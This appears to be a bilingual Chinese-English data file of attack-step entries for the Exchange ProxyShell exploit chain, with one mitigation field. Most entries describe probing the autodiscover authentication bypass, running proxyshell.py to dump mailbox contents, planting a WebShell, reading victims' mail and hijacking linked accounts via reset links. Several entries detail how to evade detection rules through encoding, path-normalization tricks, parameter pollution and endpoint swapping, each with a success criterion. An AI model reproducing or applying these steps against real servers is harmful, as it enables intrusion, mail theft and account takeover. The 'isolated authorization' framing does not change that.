mitigation.en: Upgrade to a supported CU and install security updates covering the three CVEs, verifying with the Health Checker; restrict Autodiscover/PowerShell virtual directory exposure and audit PowerShell pipeline invocations and mailbox access records. After the fix, regress with the step 1 sample: the proxy path must return 401/404.

title.zh: 探测 autodiscover 认证旁路

description.zh: 用 curl 请求 autodiscover.json?@域/mapi/nspi 变形路径；返回接口数据而非登录跳转即认证绕过成立。
description.en: Request the autodiscover.json?@domain/mapi/nspi variant with curl; API data instead of a login redirect confirms the auth bypass.

title.zh: 链式利用导出邮箱与写权限
title.en: Chain the exploit to mail and write access

description.zh: 运行 proxyshell.py 指定管理员邮箱；依次输出 SID、邮件内容与可写路径即完成 SSRF 到 Exchange 管控面的贯穿。
description.en: Run proxyshell.py with the admin mailbox; SID, mailbox contents and writable paths printed in sequence complete the SSRF-to-Exchange-control chain.

description.zh: 以 Email 参数构造 GET /owa/ 请求；返回邮箱界面即能以目标身份收发邮件，可借重置链接接管关联账号。
description.en: Build the GET /owa/ request with the Email parameter; the mailbox UI lets you send and receive as the victim and hijack linked accounts via reset links.

description.zh: 绕过对 autodiscover.json?@ 拼接特征（ProxyShell 标志）的规则：分别对 ? 和 @ 做 %3F %40 编码乃至双重编码 %253F，客户端证书豁免逻辑按 Email 前缀解析仍生效；成功判据：响应为 200/301 而非 401，且证书认证被跳过（无 WWW-Authenticate 提示）。
description.en: Bypasses rules on the signature autodiscover.json?@ splice: encoding ? and @ as %3F %40 with double-encoding %253F keeps the client-cert exempt parsing by Email prefix intact; success criterion: a 200/301 instead of 401 with client-cert authentication skipped (no WWW-Authenticate challenge).

description.zh: 绕过大小写敏感或按规范化前字面匹配的路径规则：目录大小写、点段插入、双斜杠与 %2e 变形在 Exchange 前端规范化后仍路由到 MAPI 后端；成功判据：状态码与原始请求一致（非 401），证明仍走了 ProxyShell 豁免链。
description.en: Bypasses case-sensitive or pre-normalization literal path rules: directory case, dot segments, doubled slashes and %2e still route to the MAPI backend after front-end normalization; success criterion: status codes match the original request (not 401), proving the ProxyShell exempt chain still applied.

description.zh: 绕过对 &Email= 参数特征匹配的规则：HPP 双 Email 取值、参数名小写 email、尾随无害参数 X-Pad 改变查询串形状而解析结果不变；成功判据：仍返回 200 且 Autodiscover/MAPI 响应内容与原请求一致。
description.en: Bypasses rules matching the &Email= parameter signature: HPP double-Email values, lowercase email name and a trailing X-Pad parameter reshape the query without changing parsed results; success criterion: still 200 with Autodiscover/MAPI bodies identical to the original request.

description.zh: 绕过只盯 /mapi/nspi 特征的拦截：同一 autodiscover.json 豁免链可换接 /mapi/emsmdb（代理登录端点）或 /EWS，再以 POST + MAPI 头完成认证；成功判据：emsmdb Authenticate 返回 200 且带 X-ResponseId/MAPI 会话 Cookie（与 ProxyShell 链一致）。
description.en: Bypasses blocks fixated on /mapi/nspi: the same autodiscover.json exemption chain attaches to /mapi/emsmdb (proxy logon endpoint) or /EWS, then completes auth via POST with MAPI headers; success criterion: emsmdb Authenticate returns 200 with X-ResponseId/MAPI session cookies as in the ProxyShell chain.

title.en: Exchange ProxyShell Patch Regression Reviewed Command 1

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EXCHANGE_PROXYSHELL_E_1 与蓝队日志；成功时 autodiscover 代理返回 200，确认后端代理链路可用。
description.en: Run in the isolated authorization and correlate PAYLOADER_EXCHANGE_PROXYSHELL_E_1 with blue-team logs; the autodiscover proxy returning 200 confirms the backend proxy chain works.

title.zh: 利用落地 WebShell 路径
title.en: Exchange ProxyShell Patch Regression Reviewed Command 2

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EXCHANGE_PROXYSHELL_E_2 与蓝队日志；成功时脚本完成利用并输出可访问的 WebShell 路径。
description.en: Run in the isolated authorization and correlate PAYLOADER_EXCHANGE_PROXYSHELL_E_2 with blue-team logs; the exploit completing and printing an accessible WebShell path confirms success.

title.zh: 代理转发访问 OWA 邮箱
title.en: Exchange ProxyShell Patch Regression Reviewed Command 3

description.zh: 在隔离授权环境运行并关联 PAYLOADER_EXCHANGE_PROXYSHELL_E_3 与蓝队日志；成功时请求被转发至后端 /owa/ 并返回目标邮箱信息。
description.en: Run in the isolated authorization and correlate PAYLOADER_EXCHANGE_PROXYSHELL_E_3 with blue-team logs; the request forwarding to the backend /owa/ and returning target mailbox information confirms success.
